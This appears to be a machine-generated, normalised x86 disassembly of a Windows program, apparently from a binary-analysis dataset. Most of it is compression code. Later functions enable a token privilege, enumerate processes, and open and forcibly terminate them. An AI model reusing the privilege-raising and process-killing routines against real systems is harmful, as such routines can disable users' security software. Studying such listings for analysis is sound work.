inc [ esi + ecx * 2 + 0x724e ]
movzx eax [ esi + ecx * 2 + 0x724e ]
lea edx [ ebx + 0x1 ]
movzx edi ax
movzx eax dx
movsx edx ax
cmp di [ esi + edx * 2 + 0x724e ]
jbe r-xdata
movsx eax bx
movzx ebx [ esi + eax * 2 + 0x7736 ]
test bx bx
jne r-xdata
lea ecx [ ecx ]
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
inc eax
movsx edx ax
cmp di [ esi + edx * 2 + 0x724e ]
ja r-xdata
dec eax
movsx edx ax
mov bp [ esi + edx * 2 + 0x724e ]
mov [ esi + ecx * 2 + 0x724e ] bp
mov [ esi + edx * 2 + 0x724e ] di
movzx edi [ esi + ecx * 2 + 0x7e90 ]
movsx ebp di
mov [ esi + ebp * 2 + 0x7736 ] ax
mov ebp 0x273
cmp di bp
jge r-xdata
movzx ebp [ esi + edx * 2 + 0x7e90 ]
mov [ esi + edx * 2 + 0x7e90 ] di
movsx edx bp
mov edi 0x273
cmp bp di
mov [ esi + edx * 2 + 0x7736 ] bx
jge r-xdata
movsx ebp di
mov [ esi + ebp * 2 + 0x7738 ] ax
mov [ esi + ecx * 2 + 0x7e90 ] bp
movzx ebx ax
mov [ esi + edx * 2 + 0x7738 ] bx
sub_40cb60
push ecx
push ebx
push esi
mov esi eax
movzx eax di
movzx eax [ esi + eax * 2 + 0x7c1c ]
xor ebx ebx
mov [ esp + 0x8 ] ebx
movsx ecx ax
movzx eax [ esi + ecx * 2 + 0x7736 ]
mov edx 0x272
inc ebx
cmp ax dx
jne r-xdata
add [ esp + 0x8 ] 0x8000
shr [ esp + 0x8 ] 0x1
test al 0x1
je r-xdata
mov eax [ esp + 0x8 ]
call sub_40c7a0
mov ax [ esp + 0x8 ]
mov [ esi + 0x837e ] ax
push edi
mov eax esi
mov [ esi + 0x8380 ] bx
call sub_40ca50
pop esi
pop ebx
pop ecx
retn
sub_40cbd0
push ecx
push esi
mov esi eax
movzx eax [ esi + 0x8374 ]
push edi
mov ecx 0x273
mov di ax
mov [ esp + 0x8 ] eax
cmp di cx
jae r-xdata
add eax 0xfd8d
mov [ esp + 0x8 ] eax
push eax
mov eax esi
call sub_40ca50
mov ax [ esp + 0x8 ]
pop edi
pop esi
pop ecx
retn
lea ecx [ ecx ]
call sub_40c5a0
add di ax
movzx edx di
movzx eax [ esi + edx * 2 + 0x7e90 ]
mov ecx 0x273
mov di ax
mov [ esp + 0x8 ] eax
cmp di cx
jb r-xdata
sub_40cc30
sub esp 0x28
push ebp
push esi
mov esi eax
movzx eax [ esi ]
xor ebp ebp
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x83a8 ]
mov [ esi + 0x4 ] ebp
cmp eax ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x8388 ]
push ebp
lea ecx [ esp + 0x30 ]
push ecx
push 0x1
lea edx [ esp + 0x20 ]
push edx
push eax
mov [ esp + 0x40 ] ebp
call [ WriteFile@IAT ]
jmp r-xdata
movzx edx [ esi + 0x1 ]
mov eax [ esi + 0x83a8 ]
mov [ esp + 0x14 ] edx
cmp eax ebp
jne r-xdata
lea ecx [ esp + 0x14 ]
push ecx
call sub_40d520
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x8388 ]
push ebp
lea eax [ esp + 0x30 ]
push eax
push 0x1
lea ecx [ esp + 0x20 ]
push ecx
push edx
mov [ esp + 0x40 ] ebp
call [ WriteFile@IAT ]
jmp r-xdata
movzx ecx [ esi + 0x2 ]
mov eax [ esi + 0x83a8 ]
mov [ esp + 0x14 ] ecx
cmp eax ebp
jne r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_40d520
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0x8388 ]
push ebp
lea edx [ esp + 0x30 ]
push edx
push 0x1
lea eax [ esp + 0x20 ]
push eax
push ecx
mov [ esp + 0x40 ] ebp
call [ WriteFile@IAT ]
jmp r-xdata
movzx eax [ esi + 0x3 ]
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x83a8 ]
cmp eax ebp
jne r-xdata
lea edx [ esp + 0x14 ]
push edx
call sub_40d520
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x8388 ]
push ebp
lea ecx [ esp + 0x30 ]
push ecx
push 0x1
lea edx [ esp + 0x20 ]
push edx
push eax
mov [ esp + 0x40 ] ebp
call [ WriteFile@IAT ]
jmp r-xdata
cmp [ esi ] ebp
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
call sub_40d520
pop esi
pop ebp
add esp 0x28
retn
push ebx
push edi
mov edx esi
mov [ esi ] ebp
call sub_40c830
mov eax 0x1000
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
lea edi [ esi + 0x504c ]
mov ecx 0x80
[ edi ]
mov eax 0x1000
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
lea edi [ esi + 0x524c ]
mov ecx 0x800
push 0xfc4
[ edi ]
lea eax [ esi + 0x8 ]
push 0x20
push eax
mov [ esp + 0x1c ] ebp
mov [ esp + 0x24 ] 0xfc4
call sub_414890
add esp 0xc
xor edi edi
mov [ esp + 0x14 ] edi
nop
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x8384 ]
push ecx
lea eax [ esp + 0x24 ]
push eax
mov [ esp + 0x28 ] ecx
push 0x1
lea ecx [ esp + 0x28 ]
push ecx
push edx
call [ ReadFile@IAT ]
mov ebx [ esp + 0x20 ]
jmp r-xdata
movsx edx di
mov [ esi ] edx
mov edi 0xfc3
mov edi [ esi + 0x83a0 ]
mov ebx eax
mov eax [ esi + 0x8394 ]
lea ecx [ edi + 0x1 ]
cmp ecx eax
jle r-xdata
cmp ebx 0x1
jne r-xdata
push edi
mov eax esi
call sub_40c250
dec edi
mov eax 0xf88
cmp di ax
jge r-xdata
push 0xfc4
mov eax esi
call sub_40c250
jmp r-xdata
mov edx [ esi + 0x838c ]
push ebx
add edx edi
push edx
lea eax [ esp + 0x24 ]
push eax
call sub_4158c0
add esp 0xc
add edi ebx
mov [ esi + 0x83a0 ] edi
mov edi [ esp + 0x14 ]
sub eax edi
mov ebx eax
mov eax [ esp + 0x1c ]
cmp ax 0xffff
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ esi + 0x1046 ] ax
jle r-xdata
movsx ecx di
inc edi
cmp di 0x3c
mov [ ecx + esi + 0xfcc ] al
mov [ esp + 0x14 ] edi
jl r-xdata
movzx eax [ esi + 0x1046 ]
cmp ax 0x2
jg r-xdata
mov [ esi + 0x1046 ] ax
mov eax [ esi + 0x83a8 ]
xor ecx ecx
mov [ esp + 0x1c ] ecx
cmp eax ecx
jne r-xdata
lea edi [ eax + 0xfd ]
mov eax esi
call sub_40cb60
movzx ebx [ esi + 0x1044 ]
mov ax bx
shr ax 0x6
movzx eax ax
movzx cx [ eax + rw-data ]
movzx dx [ eax + rw-data ]
mov al [ esi + 0x837c ]
shl cx 0x8
movzx edi cx
mov ebp edi
mov cl al
shr bp cl
movzx edx dx
or [ esi + 0x837a ] bp
add al dl
xor ebp ebp
mov [ esp + 0x34 ] edx
mov [ esi + 0x837c ] al
cmp al 0x8
jb r-xdata
movsx edx [ esp + 0x18 ]
mov ecx 0x1
mov [ esi + 0x1046 ] cx
movzx di [ edx + esi + 0x8 ]
mov eax esi
call sub_40cb60
jmp r-xdata
mov al [ esi + 0x837c ]
shl ebx 0xa
movzx edi bx
mov cl al
mov edx edi
shr dx cl
add al 0x6
mov [ esi + 0x837c ] al
or [ esi + 0x837a ] dx
cmp al 0x8
jb r-xdata
movzx eax [ esi + 0x837b ]
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x83a8 ]
cmp eax ebp
jne r-xdata
movzx ecx [ esi + 0x1046 ]
xor edi edi
xor eax eax
cmp ax cx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x34 ] edi
jge r-xdata
mov ebp [ esp + 0x10 ]
movzx eax [ esi + 0x837b ]
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x83a8 ]
cmp eax ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x8388 ]
push ebp
lea ecx [ esp + 0x24 ]
push ecx
push 0x1
lea edx [ esp + 0x28 ]
push edx
push eax
mov [ esp + 0x34 ] ebp
call [ WriteFile@IAT ]
mov eax [ esp + 0x20 ]
jmp r-xdata
cmp [ esp + 0x14 ] 0x0
jg r-xdata
mov eax [ esi + 0x83a8 ]
xor edx edx
mov [ esp + 0x10 ] edx
cmp eax edx
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x8388 ]
push ebp
lea ecx [ esp + 0x2c ]
push ecx
push 0x1
lea edx [ esp + 0x28 ]
push edx
push eax
mov [ esp + 0x3c ] ebp
call [ WriteFile@IAT ]
mov eax [ esp + 0x28 ]
jmp r-xdata
lea ecx [ esp + 0x1c ]
push ecx
call sub_40d520
cmp eax 0x1
jne r-xdata
cmp [ esi + 0x837c ] 0x0
pop edi
pop ebx
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x8384 ]
push edx
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] edx
push 0x1
lea edx [ esp + 0x1c ]
push edx
push eax
call [ ReadFile@IAT ]
mov ebx [ esp + 0x30 ]
jmp r-xdata
lea ecx [ esp + 0x1c ]
push ecx
call sub_40d520
cmp eax 0x1
jne r-xdata
add [ esi + 0x837c ] 0xf8
cmp [ esi + 0x837c ] 0x8
jb r-xdata
movzx ecx [ esi + 0x837b ]
mov eax [ esi + 0x83a8 ]
mov [ esp + 0x28 ] ecx
test eax eax
jne r-xdata
cmp di cx
mov [ esp + 0x10 ] ebp
jge r-xdata
mov edi [ esi + 0x83a0 ]
mov ebx eax
mov eax [ esi + 0x8394 ]
lea ecx [ edi + 0x1 ]
cmp ecx eax
jle r-xdata
cmp ebx 0x1
jne r-xdata
add [ esi + 0x837c ] 0xf8
cmp [ esi + 0x837c ] 0x8
jb r-xdata
shl [ esi + 0x837a ] 0x8
inc [ esi + 0x4 ]
movzx edx [ esi + 0x837a ]
mov eax [ esi + 0x83a8 ]
mov [ esp + 0x1c ] edx
cmp eax ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0x8388 ]
push eax
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x34 ] eax
push 0x1
lea eax [ esp + 0x34 ]
push eax
push ecx
call [ WriteFile@IAT ]
mov eax [ esp + 0x2c ]
jmp r-xdata
sub ecx edi
movzx edi cx
nop
mov edx [ esi + 0x838c ]
push ebx
add edx edi
push edx
lea eax [ esp + 0x18 ]
push eax
call sub_4158c0
add esp 0xc
add edi ebx
mov [ esi + 0x83a0 ] edi
mov edi [ esp + 0x34 ]
sub eax edi
mov ebx eax
mov ecx [ esp + 0x1c ]
cmp [ esp + 0x10 ] 0xffff
je r-xdata
shl [ esi + 0x837a ] 0x8
inc [ esi + 0x4 ]
movzx edx [ esi + 0x837a ]
mov eax [ esi + 0x83a8 ]
mov [ esp + 0x1c ] edx
cmp eax ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x8388 ]
push ebp
lea eax [ esp + 0x28 ]
push eax
push 0x1
lea ecx [ esp + 0x28 ]
push ecx
push edx
mov [ esp + 0x38 ] ebp
call [ WriteFile@IAT ]
mov eax [ esp + 0x24 ]
jmp r-xdata
lea edx [ esp + 0x28 ]
push edx
call sub_40d520
cmp eax 0x1
jne r-xdata
sub edi 0x1
jne r-xdata
push ecx
mov eax esi
call sub_40c250
mov ebx ebp
mov eax esi
call sub_40c460
cmp bp 0x3b
movsx ecx bp
lea eax [ ecx + esi ]
mov cl [ esp + 0x10 ]
mov [ eax + 0x8 ] cl
jge r-xdata
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x8388 ]
push ebp
lea eax [ esp + 0x30 ]
push eax
push 0x1
lea ecx [ esp + 0x28 ]
push ecx
push edx
mov [ esp + 0x40 ] ebp
call [ WriteFile@IAT ]
mov eax [ esp + 0x2c ]
jmp r-xdata
lea eax [ esp + 0x1c ]
push eax
call sub_40d520
cmp eax 0x1
jne r-xdata
inc [ esi + 0x4 ]
mov ebx ebp
mov eax esi
call sub_40c460
mov eax [ esp + 0x18 ]
lea ecx [ eax + 0x1 ]
mov eax [ esp + 0x14 ]
inc ebp
dec eax
and ecx 0xfff
and ebp 0xfff
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] eax
test ax ax
je r-xdata
mov [ esp + 0x10 ] ebp
mov edx [ esp + 0x18 ]
lea eax [ edx + 0x1 ]
and eax 0xfff
push eax
inc ebp
mov [ esp + 0x1c ] eax
mov eax esi
and ebp 0xfff
call sub_40c250
inc edi
cmp di [ esp + 0x1c ]
mov [ esp + 0x34 ] edi
jge r-xdata
mov [ eax + 0x1008 ] cl
lea eax [ esp + 0x1c ]
push eax
call sub_40d520
cmp eax 0x1
jne r-xdata
add [ esi + 0x837c ] 0xf8
movzx edx [ esi + 0x837c ]
mov ecx [ esp + 0x34 ]
add [ esi + 0x4 ] 0x2
sub ecx edx
shl edi cl
mov [ esi + 0x837a ] di
jmp r-xdata
mov ecx [ esp + 0x1c ]
jmp r-xdata
add [ esi + 0x837c ] 0xf8
movzx edx [ esi + 0x837c ]
add [ esi + 0x4 ] 0x2
mov ecx 0x6
sub ecx edx
shl edi cl
mov [ esi + 0x837a ] di
jmp r-xdata
sub_40d2d0
sub esp 0x18
push esi
push edi
mov esi eax
xor edi edi
lea edx [ esp + 0x8 ]
mov [ esi + 0x4 ] edi
mov [ esp + 0x8 ] edi
call sub_40d600
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
lea edx [ esp + 0x8 ]
mov [ esi ] eax
mov [ esp + 0x8 ] edi
call sub_40d600
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
shl eax 0x8
or [ esi ] eax
lea edx [ esp + 0x8 ]
mov [ esp + 0x8 ] edi
call sub_40d600
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
shl eax 0x10
or [ esi ] eax
lea edx [ esp + 0x8 ]
mov [ esp + 0x8 ] edi
call sub_40d600
cmp eax 0x1
je r-xdata
pop edi
pop esi
add esp 0x18
retn
push ebp
mov edx esi
call sub_40c830
push 0xfc4
lea eax [ esi + 0x8 ]
push 0x20
push eax
call sub_414890
add esp 0xc
mov ebp 0xfc4
mov [ esp + 0xc ] edi
cmp [ esi ] edi
jbe r-xdata
shl eax 0x18
or [ esi ] eax
je r-xdata
pop ebp
push ebx
lea esp [ esp ]
call sub_40c6a0
movzx edi ax
movzx eax di
movzx cx [ eax + rw-data ]
movzx ax [ eax + rw-data ]
sub ax 0x2
shl cx 0x6
movzx ebx ax
movzx edx cx
mov [ esp + 0x18 ] edx
test bx bx
je r-xdata
mov eax [ esi + 0x83a8 ]
movsx ecx bx
mov [ esp + 0x18 ] ecx
cmp eax edi
jne r-xdata
mov edx [ esp + 0x20 ]
and edi 0x3f
or edi [ esp + 0x18 ]
add edx 0xffffff03
mov eax ebp
sub eax edi
movzx ecx dx
dec eax
xor edx edx
and eax 0xfff
xor edi edi
cmp dx cx
mov [ esp + 0x24 ] ecx
jge r-xdata
add ebx 0xffff
call sub_40c5a0
lea ecx [ edi + edi ]
add ax cx
movzx edi ax
test bx bx
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0x8388 ]
push edi
lea edx [ esp + 0x18 ]
push edx
push 0x1
lea eax [ esp + 0x24 ]
push eax
push ecx
mov [ esp + 0x28 ] edi
call [ WriteFile@IAT ]
mov eax [ esp + 0x14 ]
jmp r-xdata
xor edi edi
cwde
mov [ esp + 0x20 ] eax
nop
pop ebx
lea edx [ esp + 0x18 ]
push edx
call sub_40d520
cmp eax 0x1
jne r-xdata
mov eax esi
call sub_40cbd0
movzx ebx ax
mov eax 0x100
cmp bx ax
mov [ esp + 0x20 ] ebx
jge r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0x8388 ]
push eax
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x24 ] eax
push 0x1
lea eax [ esp + 0x24 ]
push eax
push ecx
call [ WriteFile@IAT ]
mov eax [ esp + 0x1c ]
jmp r-xdata
movsx eax bp
inc ebp
and ebp 0xfff
inc [ esp + 0x10 ]
mov [ eax + esi + 0x8 ] bl
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
call sub_40d520
cmp eax 0x1
jne r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx [ esi ]
jb r-xdata
inc [ esp + 0x10 ]
movsx eax bp
inc ebp
inc edi
and ebp 0xfff
cmp di [ esp + 0x24 ]
mov [ eax + esi + 0x8 ] bl
jl r-xdata
mov ecx [ esp + 0x20 ]
lea edx [ edi + ecx ]
and edx 0xfff
movzx ax [ edx + esi + 0x8 ]
movzx ebx ax
mov eax [ esi + 0x83a8 ]
movsx ecx bx
mov [ esp + 0x18 ] ecx
test eax eax
jne r-xdata
sub_40d520
mov eax [ esi + 0x8390 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x83a4 ]
inc eax
cmp eax [ esi + 0x8398 ]
push ebx
push edi
jle r-xdata
push 0x401
mov [ esi + 0x8398 ] 0x401
call sub_410212
mov ecx [ esi + 0x8390 ]
mov [ ecx ] eax
mov edx [ esi + 0x8390 ]
add esp 0x4
cmp [ edx ] 0x0
jne r-xdata
mov eax [ esi + 0x8390 ]
mov ecx [ eax ]
add ecx [ esi + 0x83a4 ]
mov edx [ esp + 0xc ]
mov al [ edx ]
mov [ ecx ] al
inc [ esi + 0x83a4 ]
mov eax [ esi + 0x83a4 ]
mov ecx [ esi + 0x839c ]
pop edi
mov [ ecx ] eax
mov eax 0x1
pop ebx
retn 0x4
lea eax [ eax + eax * 2 ]
cdq
sub eax edx
mov edi eax
sar edi 0x1
add edi 0x400
push edi
call sub_410212
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
or eax 0xffffffff
retn 0x4
mov eax [ esi + 0x83a4 ]
mov ecx [ esi + 0x8390 ]
mov edx [ ecx ]
push eax
push edx
push ebx
call sub_4158c0
mov eax [ esi + 0x8390 ]
mov ecx [ eax ]
push ecx
call sub_410135
mov edx [ esi + 0x8390 ]
mov [ edx ] ebx
add esp 0x10
mov [ esi + 0x8398 ] edi
pop edi
or eax 0xffffffff
pop ebx
retn 0x4
sub_40d600
push ecx
mov eax [ esi + 0x83a8 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0x8384 ]
push eax
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x4 ]
push eax
push 0x1
push edx
push ecx
call [ ReadFile@IAT ]
mov eax [ esp ]
pop ecx
retn
xor eax eax
pop ecx
retn
mov ecx [ esi + 0x83a0 ]
push ebx
push edi
mov edi eax
mov eax [ esi + 0x8394 ]
lea ebx [ ecx + 0x1 ]
cmp ebx eax
jle r-xdata
mov eax [ esi + 0x838c ]
push edi
add eax ecx
push eax
push edx
call sub_4158c0
add esp 0xc
add [ esi + 0x83a0 ] edi
mov eax edi
pop edi
pop ebx
pop ecx
retn
sub eax ecx
mov edi eax
sub_40d670
push ecx
push esi
mov esi eax
mov eax [ esi + 0x83a8 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x8388 ]
push eax
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
push eax
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
push edx
call [ WriteFile@IAT ]
mov eax [ esp + 0x4 ]
jmp r-xdata
or eax 0xffffffff
pop esi
pop ecx
retn 0x4
lea eax [ esp + 0xc ]
push eax
call sub_40d520
cmp eax 0x1
je r-xdata
xor eax eax
pop esi
pop ecx
retn 0x4
sub_40d6d0
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
mov [ eax + 0x838c ] esi
mov esi [ esp + 0x10 ]
mov [ eax + 0x8390 ] ecx
mov [ eax + 0x839c ] esi
mov [ eax + 0x8394 ] edx
mov [ eax + 0x83a0 ] ebx
mov [ eax + 0x83a4 ] ebx
mov [ ecx ] ebx
mov ecx [ eax + 0x839c ]
mov [ ecx ] ebx
xor ecx ecx
mov [ eax + 0x8376 ] cx
mov [ eax + 0x8378 ] bl
mov [ eax + 0x837a ] cx
mov [ eax + 0x837c ] bl
mov [ eax ] edx
mov [ eax + 0x83a8 ] 0x1
call sub_40cc30
pop esi
xor eax eax
pop ebx
retn 0x8
sub_40d750
cmp [ esi + 0x4 ] 0x0
push edi
mov edi 0x2000
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push edi
call sub_410212
add esp 0x4
mov [ esi + 0x4 ] eax
pop edi
retn
push 0x0
push 0x2000
push eax
mov eax [ esi ]
push 0x5
call eax
cmp eax 0xc0000004
jne r-xdata
mov ecx [ esi + 0x4 ]
add edi 0x2000
push edi
push ecx
call sub_4102dc
add esp 0x8
push 0x0
push edi
mov edx eax
push edx
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push 0x5
call eax
cmp eax 0xc0000004
je r-xdata
sub_40d7b0
sub esp 0x430
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x428 ] eax
mov eax [ esp + 0x438 ]
push ebp
mov ebp [ esp + 0x438 ]
push esi
push edi
push 0x103
lea ecx [ esp + 0x32d ]
push 0x0
push ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x1b ] 0x0
mov [ esp + 0x334 ] 0x0
call sub_414890
push 0x103
lea edx [ esp + 0x231 ]
push 0x0
push edx
mov [ esp + 0x238 ] 0x0
call sub_414890
add esp 0x18
mov esi ebp
call sub_40d750
push 0x208
lea eax [ esp + 0x1c ]
push 0x0
push eax
call sub_414890
push 0x104
lea ecx [ esp + 0x230 ]
push 0x0
push ecx
call sub_414890
mov eax [ esi + 0x44 ]
add esp 0x18
lea edx [ esp + 0x18 ]
push edx
push eax
call sub_40da50
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0x3c ]
push 0x0
push 0x0
push 0x104
lea ecx [ esp + 0x334 ]
push ecx
push 0xffffffff
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0x44 ]
lea ecx [ esp + 0x328 ]
push ecx
push eax
lea ecx [ esp + 0x228 ]
push r--data
push ecx
call sub_40e24c
lea eax [ esp + 0x230 ]
add esp 0x10
mov ecx eax
mov [ esp + 0xf ] 0x1
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ esp + 0x10 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
push 0x104
mov ecx eax
lea edx [ esp + 0x224 ]
and ecx 0x3
push 0x0
push edx
[ edi ] [ esi ]
call sub_414890
lea eax [ esp + 0x128 ]
add esp 0xc
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea eax [ esp + 0x18 ]
push eax
je r-xdata
lea ecx [ esp + 0x224 ]
push r--data
push ecx
call sub_40e24c
add esp 0xc
lea ecx [ esp + 0x120 ]
push ecx
lea edx [ esp + 0x228 ]
push r--data
push edx
call sub_40e24c
add esp 0x10
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ esp + 0x10 ]
sub eax ecx
mov esi ecx
dec edi
lea eax [ esp + 0x220 ]
mov ecx eax
lea ecx [ ecx ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x4 ]
mov edx [ eax ]
add edx eax
cmp [ esp + 0xf ] 0x0
mov [ ebp + 0x4 ] edx
je r-xdata
mov esi [ ebp + 0x4 ]
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ esp + 0x434 ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_40e1e0
add esp 0x430
retn 0x8
sub_40d9b0
sub esp 0x20
push esi
mov esi eax
lea eax [ esp + 0x4 ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x8 ]
push ecx
push r--data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
pop esi
add esp 0x20
retn
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x1c ]
neg esi
push ecx
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x14 ]
sbb esi esi
push 0x0
and esi 0x2
push edx
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] esi
call [ AdjustTokenPrivileges@IAT ]
mov eax [ esp + 0x4 ]
push eax
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
pop esi
add esp 0x20
retn
mov eax 0x1
pop esi
add esp 0x20
retn
sub_40da50
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_414440
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x4 ] ebx
mov eax [ ebp + 0x8 ]
push eax
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40db6a
jmp sub_40db6a
lea ecx [ ebp - 0x24 ]
push ecx
push 0x8
push esi
call [ OpenProcessToken@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
lea edx [ ebp + 0x8 ]
push edx
push ebx
push ebx
push 0x1
mov eax [ ebp - 0x24 ]
push eax
mov edi [ GetTokenInformation@IAT ]
call edi
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + ecx ]
push edx
call sub_40fd2d
add esp 0x4
mov esi eax
mov [ ebp - 0x28 ] esi
mov eax [ ebp + 0x8 ]
add eax eax
mov [ ebp + 0x8 ] eax
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push esi
push 0x1
mov edx [ ebp - 0x24 ]
push edx
call edi
mov edi eax
mov [ ebp - 0x1c ] edi
call [ GetLastError@IAT ]
cmp edi ebx
je r-xdata
mov esi [ ebp - 0x20 ]
mov eax 0x104
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x2c ]
push ecx
mov eax [ ebp + 0xc ]
lea edx [ eax + 0x104 ]
push edx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
mov edx [ esi ]
push edx
push ebx
call [ LookupAccountSidA@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
sub_40db6a
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x24 ]
cmp eax ebx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push eax
call sub_40f2fb
add esp 0x4
sub_40dbb0
push esi
push edi
mov edi 0x1
mov eax edi
call sub_40d9b0
mov eax [ esp + 0xc ]
push eax
push edi
push 0x1fffff
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
xor eax eax
call sub_40d9b0
mov eax edi
pop edi
pop esi
retn 0x4
push 0x0
push esi
call [ TerminateProcess@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
sub_40dc10
sub esp 0x44
push ebx
push ebp
push esi
push edi
mov esi ecx
mov edi eax
call sub_40d750
xor ebp ebp
push 0x208
mov [ esp + 0x20 ] ebp
call sub_40fd2d
mov ebx [ MultiByteToWideChar@IAT ]
add esp 0x4
push ebp
push ebp
push 0xffffffff
push edi
push ebp
push ebp
mov [ esp + 0x28 ] eax
call ebx
push eax
mov eax [ esp + 0x14 ]
push eax
push 0xffffffff
push edi
push ebp
push ebp
call ebx
cmp [ eax + 0x3c ] 0x0
jne r-xdata
mov [ esp + 0x1c ] 0x1
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x3c ]
mov ecx [ esp + 0x10 ]
push 0x4
push eax
push ecx
call sub_420613
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ eax ]
add ecx eax
mov [ esi + 0x4 ] ecx
mov eax [ esi + 0x4 ]
mov edx [ eax ]
add edx eax
cmp [ esp + 0x1c ] 0x0
mov [ esi + 0x4 ] edx
je r-xdata
mov edx [ esi + 0x4 ]
mov edi [ edx + 0x44 ]
lea ebx [ eax + 0x1 ]
lea eax [ esp + 0x14 ]
